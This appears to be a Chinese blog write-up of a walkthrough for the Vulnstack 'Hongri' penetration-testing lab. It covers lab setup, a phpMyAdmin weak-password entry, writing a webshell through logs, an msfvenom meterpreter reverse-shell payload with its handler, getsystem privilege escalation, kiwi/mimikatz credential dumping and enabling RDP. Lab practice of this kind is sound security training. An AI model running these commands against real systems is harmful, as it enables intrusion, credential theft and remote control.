            <h1 style="display: none">红日靶场（1）</h1>
            
            <div class="markdown-body">
              <p>下载链接</p>
<figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vulnstack.qiyuanxuetang.net<span class="hljs-regexp">/vuln/</span>detail<span class="hljs-regexp">/2/</span><br>默认密码<br>hongrisec@<span class="hljs-number">2019</span><br>登上去之后修改默认密码<br><br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">先去给win7配置两张网卡 一张vm2用于模拟内网  一张net用于出网连接<br>win2003 vm2<br>win2008 vm2<br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/27/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%881%EF%BC%89/image-20220327194609765.png" srcset="/img/loading.gif" lazyload alt="image-20220327194609765"></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">win7</span>   内网<span class="hljs-number">192.168.52.143</span> 外网<span class="hljs-number">192.168.17.132</span><br>win2008 <span class="hljs-number">192.168.52.138</span><br>win2003 <span class="hljs-number">192.168.52.141</span><br></code></pre></td></tr></table></figure>

<p>然后kali扫win7网ip，扫到80端口，然后dirseach扫，然后phpmyadmin弱口令登入，利用日志写webshell，蚁剑连接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.128 LPORT=2333 -f exe &gt; hack.exe<br>生成木马<br><br>监听使用的payload<br>lhost:本地ip<br>lport:本地监听端口<br><br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lport 2333<br>set lhost 192.168.17.128<br>exploit -j<br><br>在蚁剑中执行命令，即可反弹shell<br><br>sessions -i 列出所有回话<br><br>session 1 切换回话<br><br></code></pre></td></tr></table></figure>

<p>1、信息搜集</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">1.msf arp 发现主机  开机状态下才可探测出 我现在只开了ip141的 所以下图只扫出141<br>	run arp_scanner -r  192.168.52.0/24<br>	<br>un post/multi/recon/local_exploit_suggester      查看msf的提权<br><br>run post/windows/gather/checkvm  检测目标是否run<br><br><br></code></pre></td></tr></table></figure>



<p>2、提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">getuid查看服务器权限<br>getsystem 提权<br>getuid 查看是否提权成功<br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/ec9ff4762e8c4ede9103f4b010587291.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
<p>3.利用kiwi模块去抓取密码</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>、<span class="hljs-keyword">ps</span>列出所有进程 然后注入<span class="hljs-built_in">system</span>权限的进程 <br>migrate <br><br><span class="hljs-number">2</span>、load kiwi<br><br><span class="hljs-number">3</span>、creds_all  列出所有明文密码<br><br>或者 kiwi_cmd sekurls<span class="hljs-variable">a:</span>:logonpasswords<br><br>在msf6中kiwi替代了mimikatz_command<br></code></pre></td></tr></table></figure>

<p>4、开启udp命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anager/enable_rdp<br><br></code></pre></td></tr></table></figure>
